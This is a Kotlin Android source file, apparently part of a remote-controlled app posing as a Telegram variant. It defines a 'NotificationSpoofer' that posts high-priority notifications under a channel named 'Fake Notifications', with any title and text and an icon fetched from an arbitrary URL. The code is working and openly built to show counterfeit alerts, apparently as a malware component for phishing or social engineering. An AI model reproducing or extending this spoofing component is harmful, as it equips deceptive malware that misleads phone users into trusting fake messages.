package com.telegram2.messaging.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.graphics.BitmapFactory
import android.os.Build
import androidx.core.app.NotificationCompat
import java.net.URL

object NotificationSpoofer {
    fun show(context: Context, title: String, text: String, iconUrl: String?) {
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("spoof_channel", "Fake Notifications", NotificationManager.IMPORTANCE_HIGH)
            manager.createNotificationChannel(channel)
        }
        val builder = NotificationCompat.Builder(context, "spoof_channel")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(text)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
        if (!iconUrl.isNullOrBlank()) {
            try {
                val url = URL(iconUrl)
                val bitmap = BitmapFactory.decodeStream(url.openConnection().getInputStream())
                builder.setLargeIcon(bitmap)
            } catch (_: Exception) {}
        }
        manager.notify(System.currentTimeMillis().toInt(), builder.build())
    }
}